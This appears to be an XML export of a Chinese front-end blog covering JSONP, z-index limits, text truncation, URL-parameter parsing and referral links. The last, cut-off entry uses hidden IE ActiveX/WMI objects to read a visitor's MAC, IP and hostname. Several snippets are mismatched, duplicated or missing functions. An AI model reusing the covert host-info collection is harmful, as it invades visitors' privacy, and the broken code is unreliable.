/&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;div&gt;&lt;h3&gt;瀑布流&lt;/h3&gt;&lt;a href="javascript:void(0)" title=""&gt;&lt;img src="01.jpg" alt="" title="" /&gt;&lt;/a&gt;&lt;p&gt;瀑布流瀑布流瀑布流瀑布流瀑布流瀑布流&lt;/p&gt;&lt;span&gt;瀑布流瀑布流瀑布流瀑布流&lt;/span&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>瀑布流</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax、json与jsonp详解：什么是json、jsonp，和ajax的区别]]></title>
    <url>%2F2015%2F07%2F12%2Fajax%E3%80%81json%E4%B8%8Ejsonp%E8%AF%A6%E8%A7%A3%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AFjson%E3%80%81jsonp%EF%BC%8C%E5%92%8Cajax%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[现在前后端跨域传输比较流行的技术就是jsonp了，传递格式那就是json，至于ajax，历史比较久了吧，05年的时候虽然才开始高调登台，但从技术利用历史上看，98年的时候就已经在使用了。由于现在很多人（当然我们团队也是）都在使用jquery、ext等各种库，而且使用这些库来调用jsonp非常容易，但这里有很多误解。因为这些库均把jsonp归入了ajax范畴（可能是为了方便整个库的结构开发，毕竟两者或多或少还是有一些关系的）。一直想写一下ajax、json、jsonp三者之间的区别，但苦于没时间。今日突然发现有篇博文不错，转过来，作为资料保存。本文主要讲解ajax、json、jsonp的区别，相关提问可能会是什么是ajax、什么是json、什么是jsonp？json和jsonp的区别、ajax和jsonp的联系与区别，jsonp和ajax有关系吗？等等。以下内容转自互联网，从转载地方看，应该也是转载，或者说是采集来的，就不再去找原文地址了。一、前言由于Sencha Touch 2这种开发模式的特性，基本决定了它原生的数据交互行为几乎只能通过AJAX来实现。当然了，通过调用强大的PhoneGap插件然后打包，你可以实现100%的Socket通讯和本地数据库功能，又或者通过HTML5的WebSocket也可以实现与服务器的通讯和服务端推功能，但这两种方式都有其局限性，前者需要PhoneGap支持，后者要求用户设备必须支持WebSocket，因此都不能算是ST2的原生解决方案，原生的只有AJAX。说到AJAX就会不可避免的面临两个问题，第一个是AJAX以何种格式来交换数据？第二个是跨域的需求如何解决？这两个问题目前都有不同的解决方案，比如数据可以用自定义字符串或者用XML来描述，跨域可以通过服务器端代理来解决。但到目前为止最被推崇或者说首选的方案还是用JSON来传数据，靠JSONP来跨域。而这就是本文将要讲述的内容。JSON和JSONP虽然只有一个字母的差别，但其实他们根本不是一回事儿：JSON是一种数据交换格式，而JSONP是一种依靠开发人员的聪明才智创造出的一种非官方跨域数据交互协议。我们拿最近比较火的谍战片来打个比方，JSON是地下党们用来书写和交换情报的“暗号”，而JSONP则是把用暗号书写的情报传递给自己同志时使用的接头方式。看到没？一个是描述信息的格式，一个是信息传递双方约定的方法。既然随便聊聊，那我们就不再采用教条的方式来讲述，而是把关注重心放在帮助开发人员理解是否应当选择使用以及如何使用上。二、什么是json？json到底是什么？前面简单说了一下，JSON是一种基于文本的数据交换方式，或者叫做数据描述格式，你是否该选用他首先肯定要关注它所拥有的优点。JSON的优点：基于纯文本，跨平台传递极其简单；Javascript原生支持，后台语言几乎全部支持；轻量级数据格式，占用字符数量极少，特别适合互联网传递；可读性较强，虽然比不上XML那么一目了然，但在合理的依次缩进之后还是很容易识别的；容易编写和解析，当然前提是你要知道数据结构；JSON的缺点当然也有，但在作者看来实在是无关紧要的东西，所以不再单独说明。JSON的格式或者叫规则：JSON能够以非常简单的方式来描述数据结构，XML能做的它都能做，因此在跨平台方面两者完全不分伯仲。JSON只有两种数据类型描述符，大括号{}和方括号[]，其余英文冒号:是映射符，英文逗号,是分隔符，英文双引号””是定义符。大括号{}用来描述一组“不同类型的无序键值对集合”（每个键值对可以理解为OOP的属性描述），方括号[]用来描述一组“相同类型的有序数据集合”（可对应OOP的数组）。上述两种集合中若有多个子项，则通过英文逗号,进行分隔。键值对以英文冒号:进行分隔，并且建议键名都加上英文双引号””，以便于不同语言的解析。JSON内部常用数据类型无非就是字符串、数字、布尔、日期、null 这么几个，字符串必须用双引号引起来，其余的都不用，日期类型比较特殊，这里就不展开讲述了，只是建议如果客户端没有按日期排序功能需求的话，那么把日期时间直接作为字符串传递就好，可以省去很多麻烦。现在前后端跨域传输比较流行的技术就是jsonp了，传递格式那就是json，至于ajax，历史比较久了吧，05年的时候虽然才开始高调登台，但从技术利用历史上看，98年的时候就已经在使用了。由于现在很多人（当然我们团队也是）都在使用jquery、ext等各种库，而且使用这些库来调用jsonp非常容易，但这里有很多误解。因为这些库均把jsonp归入了ajax范畴（可能是为了方便整个库的结构开发，毕竟两者或多或少还是有一些关系的）。一直想写一下ajax、json、jsonp三者之间的区别，但苦于没时间。今日突然发现有篇博文不错，转过来，作为资料保存。本文主要讲解ajax、json、jsonp的区别，相关提问可能会是什么是ajax、什么是json、什么是jsonp？json和jsonp的区别、ajax和jsonp的联系与区别，jsonp和ajax有关系吗？等等。JSON实例：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// 描述一个人var person = &#123;"Name": "Bob","Age": 32,"Company": "IBM","Engineer": true&#125;// 获取这个人的信息var personAge = person.Age;// 描述几个人var members = [&#123;"Name": "Bob","Age": 32,"Company": "IBM","Engineer": true&#125;,&#123;"Name": "John","Age": 20,"Company": "Oracle","Engineer": false&#125;,&#123;"Name": "Henry","Age": 45,"Company": "Microsoft","Engineer": false&#125;]// 读取其中John的公司名称var johnsCompany = members[1].Company;// 描述一次会议var conference = &#123;"Conference": "Future Marketing","Date": "2012-6-1","Address": "Beijing","Members":[&#123;"Name": "Bob","Age": 32,"Company": "IBM","Engineer": true&#125;,&#123;"Name": "John","Age": 20,"Company": "Oracle","Engineer": false&#125;,&#123;"Name": "Henry","Age": 45,"Company": "Microsoft","Engineer": false&#125;]&#125;// 读取参会者Henry是否工程师var henryIsAnEngineer = conference.Members[2].Engineer;关于JSON，就说这么多，更多细节请在开发过程中查阅资料深入学习。JSONP的客户端具体实现：不管jQuery也好，extjs也罢，又或者是其他支持jsonp的框架，他们幕后所做的工作都是一样的，下面我来循序渐进的说明一下jsonp在客户端的实现：1、我们知道，哪怕跨域js文件中的代码（当然指符合web脚本安全策略的），web页面也是可以无条件执行的。远程服务器remoteserver.com根目录下有个remote.js文件代码如下：1alert(&apos;我是远程文件&apos;);本地服务器localserver.com下有个jsonp.html页面代码如下：123456789&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;script type="text/javascript" src="http://remoteserver.com/remote.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;毫无疑问，页面将会弹出一个提示窗体，显示跨域调用成功。2、现在我们在jsonp.html页面定义一个函数，然后在远程remote.js中传入数据进行调用。jsonp.html页面代码如下：123&lt;script type="text/javascript"&gt;// &lt;![CDATA[var localHandler = function(data)&#123; alert('我是本地函数，可以被跨域的remote.js文件调用，远程js带来的数据是：' + data.result); &#125;;// ]]&gt;&lt;/script&gt;&lt;script src="http://remoteserver.com/remote.js" type="text/javascript"&gt;&lt;/script&gt;这次的代码变化比较大，不再直接把远程js文件写死，而是编码实现动态查询，而这也正是jsonp客户端实现的核心部分，本例中的重点也就在于如何完成jsonp调用的全过程。我们看到调用的url中传递了一个code参数，告诉服务器我要查的是CA1998次航班的信息，而callback参数则告诉服务器，我的本地回调函数叫做flightHandler，所以请把查询结果传入这个函数中进行调用。OK，服务器很聪明，这个叫做flightResult.aspx的页面生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）：12345flightHandler(&#123; "code": "CA1998", "price": 1780, "tickets": 5&#125;);我们看到，传递给flightHandler函数的是一个json，它描述了航班的基本信息。运行一下页面，成功弹出提示窗口，jsonp的执行全过程顺利完成！4、到这里为止的话，相信你已经能够理解jsonp的客户端实现原理了吧？剩下的就是如何把代码封装一下，以便于与用户界面交互，从而实现多次和重复调用。什么？你用的是jQuery，想知道jQuery如何实现jsonp调用？好吧，那我就好人做到底，再给你一段jQuery使用jsonp的代码（我们依然沿用上面那个航班信息查询的例子，假定返回jsonp结果不变）：123456789101112131415161718192021222324252627&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml" &gt;&lt;head&gt;&lt;title&gt;Untitled Page&lt;/title&gt;&lt;script type="text/javascript" src=jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;jQuery(document).ready(function()&#123;$.ajax(&#123;type: "get",async: false,url: "http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998",dataType: "jsonp",jsonp: "callback",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)jsonpCallback:"flightHandler",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据success: function(json)&#123;alert('您查询到航班信息：票价： ' + json.price + ' 元，余票： ' + json.tickets + ' 张。');&#125;,error: function()&#123;alert('fail');&#125;&#125;);&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;是不是有点奇怪？为什么我这次没有写flightHandler这个函数呢？而且竟然也运行成功了！哈哈，这就是jQuery的功劳了，jquery在处理jsonp类型的ajax时（还是忍不住吐槽，虽然jquery也把jsonp归入了ajax，但其实它们真的不是一回事儿），自动帮你生成回调函数并把数据取出来供success属性方法来调用，是不是很爽呀？好啦，写到这里，我已经无力再写下去，又困又累，得赶紧睡觉。朋友们要是看这不错，觉得有启发，给点个“推荐”呗！由于实在比较简单，所以就不再提供demo源码下载了。三、总结补充ajax和jsonp这两种技术在调用方式上“看起来”很像，目的也一样，都是请求一个url，然后把服务器返回的数据进行处理，因此jquery和ext等框架都把jsonp作为ajax的一种形式进行了封装；但ajax和jsonp其实本质上是不同的东西。ajax的核心是通过XmlHttpRequest获取非本页内容，而jsonp的核心则是动态添加&lt; script&gt;标签来调用服务器提供的js脚本。所以说，其实ajax与jsonp的区别不在于是否跨域，ajax通过服务端代理一样可以实现跨域，jsonp本身也不排斥同域的数据的获取。还有就是，jsonp是一种方式或者说非强制性协议，如同ajax一样，它也不一定非要用json格式来传递数据，如果你愿意，字符串都行，只不过这样不利于用jsonp提供公开服务。总而言之，jsonp不是ajax的一个特例，哪怕jquery等巨头把jsonp封装进了ajax，也不能改变着一点！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>json</tag>
        <tag>jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[z-index最大值是多少（css z-index的最大值，最小值问题）]]></title>
    <url>%2F2015%2F07%2F12%2Fz-index%E6%9C%80%E5%A4%A7%E5%80%BC%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%88css-z-index%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC%EF%BC%8C%E6%9C%80%E5%B0%8F%E5%80%BC%E9%97%AE%E9%A2%98%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文属于CSS基础知识，DIV+CSS基础知识，主要讲的是css里z-index的最大值和z-index的最小值问题。写这篇帖子，主要是因为今天在处理公司某业务时，对已有页面增加效果，期间发现有个问题，右侧广告区的wrap浮动之后做了一个相对定位，这是很可怕的，只要涉及到定位，那必然是有特权的啊，于是，没办法，看看吧，下面更可怕的，z-index：100000000，说实话，如果没有电脑，没有计算器，我自己根本就数不到这个数。当时觉得就很崩溃，莫非是CEO或者CTO写的？特权这么高？如果是他们的话，直接2147483647不得了嘛。问问看吧，回复也很简单，这个是为了兼容，兼你妹兼容，这有什么可兼容的，规范文件都找不到在谁手里。真想说脏话了，这又不是让你烧冥币呢没有小票儿……&nbsp;没办法，还是得说一下，在页面中，z-index的最大值到底可以有多大？z-index的最大值:IE FireFox Safari的z-index最大值是2147483647Opera的最大值是2147483584.IE Safari Opera在超过其最大值时按最大值处理FireFox 在超过最大值时会数据溢出正负不定,但有一点可以肯定绝对不会高于2147483647层z-index的最小值:IE FireFox Safari的z-index最小值是-2147483648Opera的z-index最小值-2147483584FireFox在-2147483648&lt;=z-index&lt;0时层不显示 在z-index&lt;-2147483648时溢出实际数字正负不定IE Safari Opera在z-index&lt;0时显示,在小于其最小值时都按其最小值处理可以看出来吧，最大的也没有超过2的32次幂，当然，1个亿远远没有到这个值，那为什么还不建议使用呢？前端团队合作！正常情况下，在一个团队维护的页面中，有很多是有规范的。试想一下，一个页面就那么大，在设计、布局过程中有几点是必须要谨慎考虑的，这也是UE的思想之一，比如宽、高、层级，如果每个人都不考虑整体效果、整体体验，那这个页面还如何处理？所以，一定要有团队规范，你想占据多大的位置、想多高的级别，对不起，请先申请，就说公司所在地区房价不高，那一平米也得4万左右了吧，所以，想要更大空间，更高的级别，请酌情处理吧！]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>z-index</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS/jQuery实现默认显示部分文字点击按钮显示全部内容]]></title>
    <url>%2F2015%2F07%2F12%2Fjsjquery%E5%AE%9E%E7%8E%B0%E9%BB%98%E8%AE%A4%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E6%96%87%E5%AD%97%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%E6%98%BE%E7%A4%BA%E5%85%A8%E9%83%A8%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[默认显示部分文字，点击按钮显示全部，类似这样的功能在一些特殊的地方会见到吧，下面与大家分享下JS、jQuery如何实现，感兴趣的朋友可以参考下哈，希望对你有所帮助123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;JS实现默认显示部分文字，点击按钮显示全部&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="box"&gt;&lt;h2&gt;民间机构提前3天预报大理地震 地震局称违法&lt;/h2&gt;&lt;p&gt;17日大理州5.0级地震发生之后，在微博上一条曾在3天前就预测大理将发生5.0级地震的微博受到了很多网友的关注。&lt;/p&gt;&lt;p&gt;记者联系上了微博博主，该博主表示，他是通过分析云南省地震局官方网站的数据得出的预报信息。对此，省地震局回应表示，地震局欢迎民间机构与地震局进行一些学术上的探讨和交流，但民间机构对外公开发布地震预报信息是违法的。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;民间机构预报地震受网友追捧&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;“预计72小时内黑色圈圈内的地区都将有一次较强震感，初步锁定为5级地震，浅源，发生的位置主要是云南东北昭通（余震）、大理西南部和腾冲交界区域、和缅甸交界区域一线（地壳运动所致）云南巧家县和四川宁南县交界区域。”早在4月14日凌晨时分，微博名为“预报中心”的网民就在微博上发布了云南地震预报信息。该微博被网友转发了377次。在大理5.0级地震发生后，“小丛”等知名网友都转发了该微博。“跪了。”知名网友“小丛”在微博上表示。&lt;/p&gt;&lt;p&gt;在大理5.0级地震发生之前，“预报中心”还陆续发布了3条地震预报的微博，并附有预报将发生地震的地图，及一张昆明地震监测点的原始数据图。&lt;/p&gt;&lt;p&gt;这一微博得到了一些网友的转发及称赞。“顶，预报高手在民间，持续关注中。”网民“orfila2011”在评论中表示；“陕西蓝天救援队”官方微博也表示，民间在地震预测工作中有价值的经验方法，有关部门应给予足够的重视。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;预报根据省地震局数据分析得出&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;该民间地震预报微博的资料显示，所在地位于湖北。“很久以前，该微博就已经在微博上播报地震预测信息，但一直很神秘。”有网友表示。昨日，记者通过微博联系上这一神秘民间地震预报机构。&lt;/p&gt;&lt;p&gt;该民间机构是怎样获得地震预报信息的？该微博博主向记者表示，他们是根据云南省地震局官网云南地震数据共享中心查询到了云南省内的一些地震监测数据，分析得出的预报信息。记者发现，确实可以通过该网站查到云南各地震监测点的预处理数据。&lt;/p&gt;&lt;p&gt;&gt;该微博博主还透露，分析这些相关数据需要很多专业知识，但并不需要仪器。对于民间机构预报地震的动力，该博主表示“物质和精神都有”。对于其他信息，该博主不愿意更多透露。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;省地震局：民间仅限于学术交流&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;“地震预测预报必须遵守相应的法律法规。”省地震局科学技术处处长、新闻发言人张俊伟在接受记者采访时表示，根据我国法律，任何个人或民间机构对外发布地震预报信息都是违法行为。&lt;/p&gt;&lt;p&gt;国家《地震预报管理条例》规定，省、自治区、直辖市的地震长期预报、地震中期预报、地震短期预报和临震预报，由省、自治区、直辖市人民政府发布。&lt;/p&gt;&lt;p&gt;对于这些民间的地震预报机构，张俊伟表示，云南省地震局一直都有所关注和了解。除了本次发布预报信息的“预报中心”外，这样的民间地震预报机构及人士还有很多。对于有网友提出能否加强官与民的合作交流。张俊伟表示，目前他个人并没有与这些民间机构取得过联系，但地震局对这些民间机构一直抱着包容与开放的态度，欢迎其与地震局进行学术探讨和交流。&lt;/p&gt;&lt;p&gt;“但另一方面，对外公开发布地震预报信息始终是违法的。我们对这些公开发布地震预报信息的民间机构也很头痛，担心给社会带来不良的影响。”张俊伟认为，市民、网友不应采信民间机构发布的地震预报消息。&lt;/p&gt;&lt;/div&gt;&lt;script&gt;function show()&#123;var box = document.getElementById("box");var text = box.innerHTML;var newBox = document.createElement("div");var btn = document.createElement("a");newBox.innerHTML = text.substring(0,200);btn.innerHTML = text.length &gt; 200 ? "...显示全部" : "";btn.href = "###";btn.onclick = function()&#123;if (btn.innerHTML == "...显示全部")&#123;btn.innerHTML = "收起";newBox.innerHTML = text;&#125;else&#123;btn.innerHTML = "...显示全部";newBox.innerHTML = text.substring(0,200);&#125;&#125;box.innerHTML = "";box.appendChild(newBox);box.appendChild(btn);&#125;show();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;jQuery插件：jquery.limittext.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/*** demo:* 1.$("#limittext").limittext();* 2.$("#limittext").limittext(&#123;"limit":1&#125;);* 3.$("#limittext").limittext(&#123;"limit":1,"fill":"......","morefn":&#123;"status":true&#125;&#125;);* 4.$("#limittext").limittext(&#123;"limit":1,"fill":"......","morefn":&#123;"status":true,"moretext":"更多","lesstext":"隐藏部分","fullfn":function()&#123;alert("more")&#125;,"lessfn":function()&#123;alert("less")&#125;&#125;&#125;)* 5.$("#limittext").limittext(&#123;"limit":1,"fill":"......","morefn":&#123;"status":true&#125;&#125;).limit("all");* @param &#123;Object&#125; opt* &#123;* limit:30,//显示文字个数* fill:'...'//隐藏时候填充的文字* morefn:&#123;* status:false,//是否启用更多* moretext: "(more)",//隐藏部分文字时候显示的文字* lesstext:"(less)",//全部文字时候显示的文字* cssclass:"limittextclass",//启用更多的A标签的CSS类名* lessfn:function()&#123;&#125;,//当文字为更少显示时候回调函数* fullfn:function()&#123;&#125;//当文字为更多时候回调函数* &#125;* @author Lonely* @link http://www.liushan.net* @Download:http://down.liehuo.net* @version 0.2*/jQuery.fn.extend(&#123;limittext:function(opt)&#123;opt=$.extend(&#123;"limit":30,"fill":"..."&#125;,opt);opt.morefn=$.extend(&#123;"status": false,"moretext": "(more)","lesstext":"(less)","cssclass": "limittextclass","lessfn": function()&#123;&#125;,"fullfn": function()&#123;&#125;&#125;,opt.morefn);var othis=this;var $this=$(othis);var body=$this.data('body');if(body==null)&#123;body=$this.html();$this.data('body',body);&#125;var getbuttom=function(showtext)&#123;return "&lt;a href='javascript:;' class='"+opt.morefn.cssclass+"'&gt;"+showtext+"&lt;a&gt;";&#125;this.limit=function(limit)&#123;if(body.length&lt;=limit||limit=='all')&#123;var showbody=body+(opt.morefn.status?getbuttom(opt.morefn.lesstext):"");&#125;else&#123;if(!opt.morefn.status)&#123;var showbody=body.substring(0,limit)+opt.fill;&#125;else&#123;var showbody=body.substring(0,limit)+opt.fill+getbuttom(opt.morefn.moretext);&#125;&#125;$this.html(showbody);&#125;this.limit(opt.limit);$("."+opt.morefn.cssclass).live("click",function()&#123;if($(this).html()==opt.morefn.moretext)&#123;showbody=body+getbuttom(opt.morefn.lesstext);$this.html(showbody);opt.morefn.fullfn();&#125;else&#123;othis.limit(opt.limit);opt.morefn.lessfn();&#125;&#125;);return this;&#125;&#125;);]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>文字显示</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery城市搜索自动补全特效]]></title>
    <url>%2F2015%2F07%2F12%2Fjquery%E5%9F%8E%E5%B8%82%E6%90%9C%E7%B4%A2%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[给大家推荐一款APP：掘金，在这个APP上有很多的技术干货。此作品是一款非常棒的Jquery特效，实现城市搜索自动补全功能，文本获得焦点的时候就会弹出层让你选择城市，默认情况下是热门城市选择，跟着是按字母检索的选项卡，还可以输入城市的首字母自动补全检索，可用键盘的上下左右控制列表的上下选择和左右分页控制。。。页面初始化核心代码如下：1234567891011121314var labelFromcity = new Array();labelFromcity ['热门城市'] = new Array(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40);labelFromcity ['A-F'] = new Array(0,3,4,5,6,28,29);labelFromcity ['G-J'] = new Array(1,7,8,9,30,31,32,33,37,40);labelFromcity ['K-N'] = new Array(10,11,12,34,35,38);labelFromcity ['P-W'] = new Array(13,14,15,16,17,18,22,24,25,36);labelFromcity ['X-Z'] = new Array(2,19,20,21,26,27,39);labelFromcity ['国际城市'] = new Array(41,42,43,44,45,46,47,48,49);var hotList = new Array(14,15,16,17,18,19);$(document).ready(function()&#123;$('#fromcity').querycity(&#123;'data':citysFlight,'tabs':labelFromcity,'hotList':hotList&#125;);$('#tocity').querycity(&#123;'data':citysFlightTo&#125;);&#125;);&lt;/script&gt;效果如下：点此下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>城市搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js获取url参数值]]></title>
    <url>%2F2015%2F07%2F12%2Fjs%E8%8E%B7%E5%8F%96url%E5%8F%82%E6%95%B0%E5%80%BC%2F</url>
    <content type="text"><![CDATA[今天碰到要在一个页面获取另外一个页面url传过来的参数，一开始很本能的想到了用 split(“?”)这样一步步的分解出需要的参数。后来想了一下，肯定会有更加简单的方法的！所以在网上找到了两个很又简单实用的方法，mark下方法一：正则分析法12345function getQueryString(name) &#123;var reg = new RegExp("(^|&amp;amp;)" + name + "=([^&amp;amp;]*)(&amp;amp;|$)", "i");var r = window.location.search.substr(1).match(reg);if (r != null) return unescape(r[2]); return null;&#125;这样调用：123alert(GetQueryString("参数名1"));alert(GetQueryString("参数名2"));alert(GetQueryString("参数名3"));方法二：这样调用：123456789&lt;Script language="javascript"&gt;var Request = new Object();Request = GetRequest();var 参数1,参数2,参数3,参数N;参数1 = Request['参数1'];参数2 = Request['参数2'];参数3 = Request['参数3'];参数N = Request['参数N'];&lt;/Script&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>url参数值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 给页面所有的A标签加某个推广地址栏参数]]></title>
    <url>%2F2015%2F07%2F12%2Fjs-%E7%BB%99%E9%A1%B5%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84a%E6%A0%87%E7%AD%BE%E5%8A%A0%E6%9F%90%E4%B8%AA%E6%8E%A8%E5%B9%BF%E5%9C%B0%E5%9D%80%E6%A0%8F%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108$(document).ready(function() &#123;addUrlParse();&#125;);// 获取地址栏的参数数组function getUrlParams() &#123;var search = window.location.search;// 写入数据字典var tmparray = search.substr(1, search.length).split("&amp;amp;");var paramsArray = new Array;if (tmparray != null) &#123;for (var i = 0; i &lt; tmparray.length; i++) &#123;var reg = /[=|^==]/; // 用=进行拆分，但不包括==var set1 = tmparray[i].replace(reg, '&amp;amp;');var tmpStr2 = set1.split('&amp;amp;');var array = new Array;array[tmpStr2[0]] = tmpStr2[1];paramsArray.push(array);&#125;&#125;// 将参数数组进行返回return paramsArray;&#125;// 根据参数名称获取参数值function GetQueryString(name) &#123;var paramsArray = getUrlParams();if (paramsArray != null) &#123;for (var i = 0; i &lt; paramsArray.length; i++) &#123;for (var j in paramsArray[i]) &#123;if (j.toLowerCase() == name.toLowerCase()) &#123;return paramsArray[i][j];&#125;&#125;&#125;&#125;return null;&#125;//function GetQueryString(name) &#123;// var reg = new RegExp("(^|&amp;amp;)" + name + "=([^&amp;amp;]*)(&amp;amp;|$)");// var r = window.location.search.substr(1).match(reg);// if (r != null) return unescape(r[2]); return null;//&#125;//搜索后添加推广ID 2013年5月23日16:16:51function addUrlParse() &#123;var ruid = GetQueryString("referraluserid");//alert("ruid=" + ruid);if (ruid != "" &amp;amp;&amp;amp; ruid != null) &#123;var aStr = "ReferralUserId=" + ruid;var url = window.location.search;try &#123;$("a").each(function(i) &#123;var hrefstr = $(this).attr("href");if (hrefstr != null &amp;amp;&amp;amp; hrefstr != "" &amp;amp;&amp;amp; hrefstr.indexOf("javascript:") &lt; 0) &#123;var jinghao = "";if (hrefstr.indexOf("#") &gt; 0) &#123;var arr = hrefstr.split("#");hrefstr = arr[0];jinghao = arr[1];&#125;// hrefstr = hrefstr + (hrefstr.indexOf("?") &gt; 0 ? url.replace("?", "&amp;amp;") : url);if (hrefstr.toLowerCase().indexOf("referraluserid=") == -1)hrefstr = hrefstr + (hrefstr.indexOf("?") &gt; 0 ? "&amp;amp;" + aStr : "?" + aStr);if (jinghao != "") &#123;hrefstr += "#" + jinghao;&#125;$(this).attr("href", hrefstr);&#125;&#125;);&#125;catch (e) &#123;alert(e);&#125;/*var hrefstr = "";try &#123;var url = window.location.search;$("a").each(function(i) &#123;hrefstr = $(this).attr("href");// alert(hrefstr.indexOf("referraluserid=") + aStr);if (hrefstr.indexOf("referraluserid=") == -1)$(this).attr("href", $(this).attr("href") + (hrefstr.indexOf("?") &gt; 0 ? "&amp;amp;" + aStr : "?" + aStr));&#125;);&#125;catch (e) &#123;alert(e + " + " + hrefstr);&#125;*/&#125;&#125;//搜索后添加推广ID 2013年5月23日16:16:51function addSearUrlParse() &#123;var ruid = GetQueryString("ReferralUserId");if (ruid != "" &amp;amp;&amp;amp; ruid != null) &#123;var aStr = "&amp;amp;ReferralUserId=" + ruid;return aStr;&#125;return "";&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js推广地址</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS获取几种URL地址的方法]]></title>
    <url>%2F2015%2F07%2F12%2Fjs%E8%8E%B7%E5%8F%96%E5%87%A0%E7%A7%8Durl%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[以下为JS获取几种URL地址的方法123456789101112131415javascriptthisURL = document.URL;thisHREF = document.location.href;thisSLoc = self.location.href;thisDLoc = document.location;thisTLoc = top.location.href;thisPLoc = parent.document.location;thisTHost = top.location.hostname;thisHost = location.hostname;tmpHPage = thisHREF.split( &quot;/&quot; );thisHPage = tmpHPage[ tmpHPage.length-1 ];tmpUPage = thisURL.split( &quot;/&quot; );thisUPage = tmpUPage[ tmpUPage.length-1 ];下面为使用JS获取MAC地址、IP地址及主机名的方法：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;&lt;/head&gt;&lt;body&gt;&lt;object classid="CLSID:76A64158-CB41-11D1-8B02-00600806D9B6" id="locator" style="display:none;visibility:hidden"&gt;&lt;/object&gt;&lt;object classid="CLSID:75718C9A-F029-11d1-A1AC-00C04FB6C223" id="foo" style="display:none;visibility:hidden"&gt;&lt;/object&gt;&lt;form name="myForm"&gt;&lt;br/&gt;MAC地址：&lt;input type="text" name="macAddress"&gt;&lt;br/&gt;IP地址：&lt;input type="text" name="ipAddress"&gt;&lt;br/&gt;主机名：&lt;input type="text" name="hostName"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;script language="javascript"&gt;var sMacAddr="";var sIPAddr="";var sDNSName="";var service = locator.ConnectServer();service.Security_.ImpersonationLevel=3;service.InstancesOfAsync(foo, 'Win32_NetworkAdapterConfiguration');&lt;/script&gt;&lt;script FOR="foo" EVENT="OnObjectReady(objObject,objAsyncContext)" LANGUAGE="JScript"&gt;if(objObject.IPEnabled != null 